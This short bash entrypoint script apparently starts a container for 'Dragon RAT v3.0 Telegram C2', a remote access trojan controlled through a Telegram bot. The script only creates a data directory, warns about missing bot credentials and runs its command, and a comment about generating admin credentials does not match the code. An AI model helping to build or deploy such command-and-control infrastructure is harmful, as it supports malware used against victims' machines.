#!/bin/bash
set -e

# Ensure data directory exists
mkdir -p /app/data

# If BOT_TOKEN or ADMIN_ID not set, generate random admin credentials and print them
if [ -z "$BOT_TOKEN" ] || [ -z "$ADMIN_ID" ]; then
    echo "====================================================="
    echo "  WARNING: BOT_TOKEN or ADMIN_ID not set!"
    echo "  Set them in Render environment variables."
    echo "  Bot will run in limited mode."
    echo "====================================================="
fi

echo "🐉 Starting Dragon RAT v3.0 Telegram C2..."
exec "$@"
